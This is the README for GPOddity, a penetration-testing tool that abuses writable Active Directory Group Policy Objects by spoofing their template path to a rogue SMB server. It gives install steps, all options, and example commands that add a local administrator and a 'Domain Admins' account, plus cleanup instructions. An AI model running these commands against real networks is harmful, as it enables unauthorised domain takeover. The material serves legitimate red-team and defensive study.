# GPOddity
The GPOddity project, aiming at automating GPO attack vectors through NTLM relaying (and more).

For more details regarding the attack and a demonstration on how to use the tool, see the associated article available at:
https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more

# Installation

## Pipx

You can install GPOddity through pipx with the following command:

```
$ python3 -m pipx install git+https://github.com/synacktiv/GPOddity
```

## Manual

Alternatively, you can install GPOddity manually by cloning the repository and installing the dependencies:

```
$ git clone https://github.com/synacktiv/GPOddity
$ python3 -m pip install -r requirements.txt
```

# Usage

```
$ python3 gpoddity.py --help
                                                                                                                                                                                                                   
 Usage: gpoddity.py [OPTIONS]                                                                                                                                                                                      
                                                                                                                                                                                                                   
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --help          Show this message and exit.                                                                                                                                                                     │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ General options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --domain               TEXT  The target domain [default: None] [required]                                                                                                                                    │
│ *  --gpo-id               TEXT  The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') [default: None] [required]                                                │
│ *  --username             TEXT  The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$') [default: None] [required]                       │
│    --password             TEXT  The password of the user having write permissions on the GPO AD object [default: None]                                                                                          │
│    --hash                 TEXT  The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT' [default: None]                                                                │
│    --dc-ip                TEXT  [Optional] The IP of the domain controller if the domain name can not be resolved. [default: None]                                                                              │
│    --ldaps                      [Optional] Use LDAPS on port 636 instead of LDAP                                                                                                                                │
│    --verbose                    [Optional] Enable verbose output                                                                                                                                                │
│    --no-smb-server              [Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup                                               │
│    --just-clean                 [Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or         │
│                                 ungraceful exit                                                                                                                                                                 │
│    --clean-file           TEXT  [Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path     │
│                                 [default: None]                                                                                                                                                                 │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Malicious Group Policy Template generation options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --command           TEXT             The command that should be executed through the malicious GPO [default: None]                                                                                              │
│ --powershell                         [Optional] Use powershell instead of cmd for command execution                                                                                                             │
│ --gpo-type          [user|computer]  [Optional] The type of GPO that we are targeting. Can either be 'user' or 'computer' [default: GPOTypes.computer]                                                          │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Group Policy Template location spoofing options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --rogue-smbserver-ip           TEXT  The IP address or DNS name of the server that will host the spoofed malicious GPO. If using the GPOddity smb server, this should be the IP address of the current host on  │
│                                      the internal network (for instance, 192.168.58.101)                                                                                                                        │
│                                      [default: None]                                                                                                                                                            │
│ --rogue-smbserver-share        TEXT  The name of the share that will serve the spoofed malicious GPO (for instance, 'synacktiv'). If you are running the embedded SMB server, do NOT provide names including    │
│                                      'SYSVOL' or 'NETLOGON' (protected by UNC path hardening by default)                                                                                                        │
│                                      [default: None]                                                                                                                                                            │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ GPOddity smb server options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --machine-name        TEXT  [Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If omitted, will use the user specified with    │
│                             the --username option, and assume that it is a valid machine account                                                                                                                │
│                             [default: None]                                                                                                                                                                     │
│ --machine-pass        TEXT  [Optional] The password of the machine account if specified with --machine-name [default: None]                                                                                     │
│ --machine-hash        TEXT  [Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT' [default: None]                                                           │
│ --comment             TEXT  [Optional] Share's comment to display when asked for shares [default: None]                                                                                                         │
│ --interface           TEXT  [Optional] The interface on which the GPOddity smb server should listen [default: 0.0.0.0]                                                                                          │
│ --port                TEXT  [Optional] The port on which the GPOddity smb server should listen [default: 445]                                                                                                   │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

# Examples

Below are some example commands taken from the article linked above.

> Exploiting a Computer GPO to add a local administrator (running the embedded SMB server).
```
$ python3 gpoddity.py --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user synacktiv_gpoddity Password123! /add && net localgroup administrators synacktiv_gpoddity /add' --rogue-smbserver-ip '192.168.58.101' --rogue-smbserver-share 'synacktiv'
```


> Exploiting a User GPO to add a domain administrator (no embedded SMB server).
```
$ python3 gpoddity.py --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --no-smb-server --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user user_gpo Password123! /add /domain && net group "Domain Admins" user_gpo /ADD /DOMAIN' --rogue-smbserver-ip '192.168.58.102' --rogue-smbserver-share 'synacktiv'
```

# About cleaning

One of the advantages of using GPOddity resides in the possibility to safely exploit GPOs, without altering legitimate GPT files, thus minimizing disruption risks in production environments. However, GPOddity still has to modify some attributes of the Group Policy Container files in order to temporarily spoof the GPT location. As a result, ensuring that the production environment remains functional supposes to revert those changes after exploitation.

By default and as explained in the article, GPOddity will do it for you by reverting any alteration performed on the GPC at the end of the exploit, when the user interrupts the program with CTRL+C. As a result, in standard conditions, you do not need to do anything to ensure everything is cleaned up.

However, if for some reason you are not able to exit GPOddity gracefully through a CTRL+C (process killed, network connection lost etc.), you can launch GPOddity with the '--just-clean' flag to perform cleaning actions in an independent manner.

This feature works in the following way. Each time GPOddity is run, the initial state of the GPO will be saved in a file under the path `cleaning/[GPO ID]/[timestamp].txt`. You can then restore all the values contained in this save file through the '--just-clean' flag. For instance, assume that you want to restore all the attributes of the GPO with ID '46993522-7D77-4B59-9B77-F82082DE9D81' to their values before running GPOddity on the 14th October 2023 at 08:08:44. You may run the following command:

```
$ python3 gpoddity.py --just-clean --domain 'corp.com' --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --username 'GPODDITY$' --password '[...]' --clean-file cleaning/46993522-7D77-4B59-9B77-F82082DE9D81/2023_10_14-08_08_44.txt
```

# Video demonstration

![GPOddity](assets/demo.gif)
